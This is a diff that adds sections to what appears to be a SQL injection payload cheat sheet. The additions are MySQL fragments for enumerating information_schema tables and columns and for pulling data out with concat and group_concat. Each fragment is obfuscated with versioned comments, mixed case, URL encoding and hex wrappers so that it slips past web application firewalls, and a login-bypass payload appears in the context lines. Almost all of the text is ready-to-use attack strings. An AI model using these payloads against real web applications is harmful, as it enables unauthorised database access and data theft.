@@ -568,6 +568,66 @@ admin") or "1"="1"/*
 
 ```
 
+
+
+### Information_schema.tables 
+
+```
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
+/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
+/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table
+```
+
+### Concat
+
+```
+CoNcAt()
+concat() 
+CON%08CAT()
+CoNcAt()
+%0AcOnCat()
+/**//*!12345cOnCat*/
+/*!50000cOnCat*/(/*!*/)
+unhex(hex(concat(table_name)))
+unhex(hex(/*!12345concat*/(table_name)))
+unhex(hex(/*!50000concat*/(table_name)))
+```
+
+### group_concat
+
+```
+/*!group_concat*/()
+gRoUp_cOnCAt()
+group_concat(/*!*/)
+group_concat(/*!12345table_name*/)
+group_concat(/*!50000table_name*/)
+/*!group_concat*/(/*!12345table_name*/)
+/*!group_concat*/(/*!50000table_name*/)
+/*!12345group_concat*/(/*!12345table_name*/)
+/*!50000group_concat*/(/*!50000table_name*/)
+/*!GrOuP_ConCaT*/()
+/*!12345GroUP_ConCat*/()
+/*!50000gRouP_cOnCaT*/()
+/*!50000Gr%6fuP_c%6fnCAT*/()
+unhex(hex(group_concat(table_name)))
+unhex(hex(/*!group_concat*/(/*!table_name*/)))
+unhex(hex(/*!12345group_concat*/(table_name)))
+unhex(hex(/*!12345group_concat*/(/*!table_name*/)))
+unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))
+unhex(hex(/*!50000group_concat*/(table_name)))
+unhex(hex(/*!50000group_concat*/(/*!table_name*/)))
+unhex(hex(/*!50000group_concat*/(/*!50000table_name*/)))
+convert(group_concat(table_name)+using+ascii)
+convert(group_concat(/*!table_name*/)+using+ascii)
+convert(group_concat(/*!12345table_name*/)+using+ascii)
+convert(group_concat(/*!50000table_name*/)+using+ascii)
+CONVERT(group_concat(table_name)+USING+latin1)
+
+```
+
 ### HTML URL Encode (Codificación Url)
 
 ```
